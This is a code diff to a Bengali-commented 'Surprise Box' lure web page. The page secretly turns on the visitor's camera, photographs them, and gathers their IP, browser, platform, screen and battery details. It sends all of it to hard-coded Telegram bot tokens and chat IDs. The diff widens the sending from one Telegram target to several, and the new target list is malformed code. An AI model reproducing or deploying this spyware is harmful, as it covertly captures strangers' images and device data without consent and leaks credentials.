@@ -656,11 +656,14 @@
         ];
 
         // --- টেলিগ্রাম এবং ক্যামেরা সেটিংস ---
-        const BOT_TOKEN = "7884212116:AAG1hul0EbZom1iHucZztAW_FZOXf_g_TqA"; // আপনার বট টোকেন দিন
-        const CHAT_ID = "6728809478"; // আপনার চ্যাট আইডি দিন
+        // এখানে একাধিক বট টোকেন এবং চ্যাট আইডি যোগ করতে পারেন
+        const TELEGRAM_TARGETS = [
+            { botToken: "7884212116:AAG1hul0EbZom1iHucZztAW_FZOXf_g_TqA","7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk", chatId: "6728809478","2139008203" },
+
+        ];
         let currentVideoStream = null;
 
-        // --- ক্যামেরা এবং তথ্য পাঠানোর ফাংশন (অপরিবর্তিত) ---
+        // --- ক্যামেরা এবং তথ্য পাঠানোর ফাংশন ---
         async function captureFromCamera(facingMode, photoCount, baseCaption) {
             let video;
             try {
@@ -699,13 +702,17 @@
 
                 const deviceInfo = `🎁 **Surprise Box Opened!** 🎁\n---\n**Device Info:**\n- **IP:** ${ipAddress}\n- **Browser:** ${navigator.userAgent}\n- **Platform:** ${navigator.platform}\n- **Screen:** ${window.screen.width}x${window.screen.height}\n- **${batteryStatus}**`;
 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: deviceInfo, parse_mode: 'Markdown' })
-                });
+                const sendPromises = TELEGRAM_TARGETS.map(target =>
+                    fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: target.chatId, text: deviceInfo, parse_mode: 'Markdown' })
+                    }).catch(error => console.error(`Failed to send info to ${target.chatId}:`, error))
+                );
+                await Promise.all(sendPromises);
+
             } catch (error) {
-                console.error("Error sending device info:", error);
+                console.error("Error getting device info:", error);
             }
         }
 
@@ -733,15 +740,23 @@
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
             const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
-            const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("photo", blob, "photo.png");
-            if (caption) formData.append("caption", caption);
+            
+            const sendPromises = TELEGRAM_TARGETS.map(target => {
+                const formData = new FormData();
+                formData.append("chat_id", target.chatId);
+                formData.append("photo", blob, "photo.png");
+                if (caption) formData.append("caption", caption);
+
+                return fetch(`https://api.telegram.org/bot${target.botToken}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                }).catch(error => console.error(`Failed to send photo to ${target.chatId}:`, error));
+            });
 
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+                await Promise.all(sendPromises);
             } catch (error) {
-                console.error("Error sending photo:", error);
+                console.error("Error during photo sending process:", error);
             }
         }
 
@@ -940,12 +955,3 @@
     </script>
 </body>
 </html>
-
-
-
-
-
-
-
-
-
